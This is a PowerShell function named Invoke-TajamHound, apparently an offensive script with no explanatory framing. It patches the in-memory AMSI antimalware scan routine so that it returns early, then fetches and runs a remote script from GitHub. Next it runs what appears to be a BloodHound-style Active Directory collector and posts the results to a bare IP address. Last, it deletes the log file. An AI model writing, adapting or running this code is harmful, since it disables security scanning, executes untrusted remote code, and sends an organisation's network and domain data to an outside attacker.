function Invoke-TajamHound {
$Apis = @"
using System;
using System.Runtime.InteropServices;
public class Apis {
  [DllImport("kernel32")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  [DllImport("amsi")]
  public static extern int AmsiInitialize(string appName, out Int64 context);
}
"@
Add-Type $Apis

$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
$p = 0; $i = 0
$SIZE_OF_PTR = 8
[Int64]$ctx = 0

[Apis]::AmsiInitialize("MyScanner", [ref]$ctx)
$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$ctx, 16)
$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64)

while ($AntimalwareProvider -ne 0)
{
  $AntimalwareProviderVtbl =  [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProvider)
  $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)

  [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
  [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, [IntPtr]$AmsiProviderScanFunc, 6)
  
  $i++
  $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$SIZE_OF_PTR))
}

$currentPath = (Get-Item -Path ".\" -Verbose).FullName
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mariffy/nota-buku/main/uni-bad/direktori-aktif/Invoke-SubTajamHound.ps1')
$tajamhoundOutput = Invoke-SubTajamHound -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
$tajamhoundOutput | Out-File -FilePath "log.txt" -Encoding UTF8
Invoke-WebRequest -Uri "http://18.134.172.169/29622395-3621-4094-996b-1fd1ca730297.php" -Method POST -ContentType 'text/plain' -InFile "log.txt"
Remove-Item -Path "log.txt"
}